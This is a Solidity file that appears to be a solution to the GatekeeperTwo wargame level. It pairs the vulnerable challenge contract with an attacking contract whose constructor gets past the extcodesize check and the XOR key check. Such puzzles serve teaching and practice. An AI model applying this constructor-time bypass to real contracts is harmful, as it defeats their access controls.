/**
 *Submitted for verification at Etherscan.io on 2022-08-28
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                uint64(0) - 1
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract Level14 {
    GatekeeperTwo gatekeeperTwoContract;

    constructor(address gatekeeperTwoAddr) public {
        gatekeeperTwoContract = GatekeeperTwo(gatekeeperTwoAddr);
        uint64 lhs = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 rhs = uint64(0) - 1;
        bytes8 gateKey = bytes8(lhs ^ rhs);
        gatekeeperTwoContract.enter(gateKey);
    }
}